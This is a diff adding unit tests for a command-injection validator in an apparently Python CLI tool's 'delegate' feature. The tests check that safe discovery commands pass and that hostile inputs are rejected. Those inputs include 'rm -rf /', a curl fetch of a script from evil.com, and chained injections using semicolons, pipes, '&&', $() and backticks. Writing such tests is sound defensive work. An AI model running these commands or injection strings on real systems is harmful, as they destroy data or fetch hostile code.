@@ -1,8 +1,15 @@
 """Tests for delegate command helper functions."""
 
+import pytest
 from unittest.mock import patch
 
-from emdx.commands.delegate import _slugify_title, _resolve_task, PR_INSTRUCTION
+from emdx.commands.delegate import (
+    _slugify_title,
+    _resolve_task,
+    _validate_discovery_command,
+    PR_INSTRUCTION,
+    SAFE_DISCOVERY_COMMANDS,
+)
 
 
 class TestSlugifyTitle:
@@ -90,3 +97,74 @@ class TestPRInstruction:
 
     def test_pr_instruction_mentions_pr_create(self):
         assert "gh pr create" in PR_INSTRUCTION
+
+
+class TestValidateDiscoveryCommand:
+    """Tests for _validate_discovery_command — prevents command injection."""
+
+    def test_allows_fd_command(self):
+        result = _validate_discovery_command("fd -e py src/")
+        assert result == ["fd", "-e", "py", "src/"]
+
+    def test_allows_find_command(self):
+        result = _validate_discovery_command("find . -name '*.py'")
+        assert result[0] == "find"
+
+    def test_allows_git_ls_files(self):
+        result = _validate_discovery_command("git ls-files")
+        assert result == ["git", "ls-files"]
+
+    def test_allows_rg_files_with_matches(self):
+        result = _validate_discovery_command("rg --files-with-matches pattern")
+        assert result[0] == "rg"
+
+    def test_allows_ls_command(self):
+        result = _validate_discovery_command("ls -la src/")
+        assert result[0] == "ls"
+
+    def test_allows_full_path_to_safe_command(self):
+        result = _validate_discovery_command("/usr/bin/fd -e py")
+        assert result[0] == "/usr/bin/fd"
+
+    def test_rejects_arbitrary_command(self):
+        import typer
+        with pytest.raises(typer.Exit):
+            _validate_discovery_command("rm -rf /")
+
+    def test_rejects_curl(self):
+        import typer
+        with pytest.raises(typer.Exit):
+            _validate_discovery_command("curl https://evil.com/script.sh")
+
+    def test_rejects_shell_injection_semicolon(self):
+        import typer
+        with pytest.raises(typer.Exit):
+            _validate_discovery_command("fd -e py; rm -rf /")
+
+    def test_rejects_shell_injection_pipe(self):
+        import typer
+        with pytest.raises(typer.Exit):
+            _validate_discovery_command("fd -e py | xargs rm")
+
+    def test_rejects_shell_injection_ampersand(self):
+        import typer
+        with pytest.raises(typer.Exit):
+            _validate_discovery_command("fd -e py && rm -rf /")
+
+    def test_rejects_shell_injection_dollar(self):
+        import typer
+        with pytest.raises(typer.Exit):
+            _validate_discovery_command("fd -e py $(whoami)")
+
+    def test_rejects_shell_injection_backtick(self):
+        import typer
+        with pytest.raises(typer.Exit):
+            _validate_discovery_command("fd -e py `whoami`")
+
+    def test_rejects_empty_command(self):
+        import typer
+        with pytest.raises(typer.Exit):
+            _validate_discovery_command("")
+
+    def test_safe_commands_list_is_readonly(self):
+        assert isinstance(SAFE_DISCOVERY_COMMANDS, frozenset)
